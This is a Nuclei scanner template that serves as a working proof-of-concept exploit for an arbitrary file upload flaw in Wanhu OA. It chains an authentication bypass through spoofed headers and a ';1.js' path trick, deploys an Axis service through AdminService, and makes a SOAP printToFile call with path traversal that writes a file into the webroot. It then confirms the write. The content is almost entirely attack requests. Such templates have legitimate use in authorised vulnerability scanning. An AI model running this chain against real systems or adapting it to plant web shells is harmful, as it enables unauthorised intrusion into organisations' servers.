nuclei/万户OA-adminservice-1-任意文件上传_poc.yaml

id: wanhu-filetest-fileupload

info:
  name: wanhu-filetest-fileupload
  author: msk

variables:
  filename: "{{to_lower(rand_base(10))}}"
  servicename: "{{to_lower(rand_base(20))}}"
  randomstr: "{{to_lower(rand_base(20))}}"
requests:
  - raw:
      - |
        GET /defaultroot/services/AdminService;1.js?method=%21--><deployment%20xmlns%3d"http%3a%2f%2fxml%2eapache%2eorg%2faxis%2fwsdd%2f"%20xmlns%3ajava%3d"http%3a%2f%2fxml%2eapache%2eorg%2faxis%2fwsdd%2fproviders%2fjava"><service%20name%3d"{{servicename}}"%20provider%3d"java%3aRPC"><parameter%20name%3d"className"%20value%3d"com%2ewhir%2eezoffice%2eezform%2eutil%2eStringUtil"%20%2f><parameter%20name%3d"allowedMethods"%20value%3d"%2a"%20%2f><%2fservice><%2fdeployment&charEncode=UTF-8 HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        X-Forwarded-For: 127.0.0.1
        X-Originating-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
        Connection: close


      - |
        POST /defaultroot/services/{{servicename}};1.js HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
        Connection: close
        Accept: */*
        SOAPAction: ""
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fil;q=0.6
        Cache-Control: no-cache
        Content-Type: text/xml;charset=UTF-8
        Pragma: no-cache

        <soapenv:Envelope
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
            xmlns:util="http://com.whir.ezoffice.ezform.util.StringUtil"
            xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
            <soapenv:Header/>
            <soapenv:Body>
                <util:printToFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                    <fileName xsi:type="soapenc:string">../server/oa/deploy/defaultroot.war/public/upload/{{filename}}.txt.</fileName>
                    <content xsi:type="soapenc:string">{{randomstr}}</content>
                </util:printToFile>
            </soapenv:Body>
        </soapenv:Envelope>

      - |
        GET /defaultroot/public/upload/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        Connection: close

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1==200 && status_code_2==200 &&  contains(body_3,randomstr)"
          - "status_code_1==200 && status_code_2==500 &&  contains(body_3,'SecurityException')"